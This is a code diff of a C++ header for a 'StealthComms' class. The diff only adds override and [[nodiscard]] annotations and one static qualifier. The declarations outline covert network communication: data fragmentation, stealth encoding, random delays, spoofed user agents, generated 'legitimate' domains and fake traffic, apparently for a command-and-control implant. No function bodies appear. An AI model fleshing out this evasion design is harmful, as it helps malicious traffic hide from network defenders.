@@ -29,13 +29,13 @@ struct SystemInfo {
 class StealthComms : public BaseComms {
 public:
     explicit StealthComms(Configuration* config);
-    ~StealthComms();
+    ~StealthComms() override;
     
     // BaseComms interface
     bool Initialize() override;
     bool SendData(const std::vector<uint8_t>& data) override;
     void Cleanup() override;
-    bool TestConnection() const override;
+    [[nodiscard]] bool TestConnection() const override;
     std::vector<uint8_t> ReceiveData() override;
     
     // Specialized stealth methods
@@ -64,7 +64,8 @@ private:
     
     // Advanced stealth techniques
     std::vector<uint8_t> FragmentData(const std::vector<uint8_t>& data);
-    std::vector<uint8_t> ApplyStealthEncoding(const std::vector<uint8_t>& data);
+
+    static std::vector<uint8_t> ApplyStealthEncoding(const std::vector<uint8_t>& data);
     bool SendFragmented(const std::vector<uint8_t>& data);
     void AddRandomDelay();
     bool ShouldUseAlternateMethod();
@@ -77,8 +78,8 @@ private:
     std::vector<uint8_t> Base64Decode(const std::string& encoded);
     
     // Traffic obfuscation
-    std::string GenerateRandomUserAgent() const;
-    std::string GenerateLegitimateDomain() const;
+    [[nodiscard]] std::string GenerateRandomUserAgent() const;
+    [[nodiscard]] std::string GenerateLegitimateDomain() const;
     std::vector<uint8_t> AddNoiseBytes(const std::vector<uint8_t>& data);
     std::vector<uint8_t> CreateFakeTraffic();
     
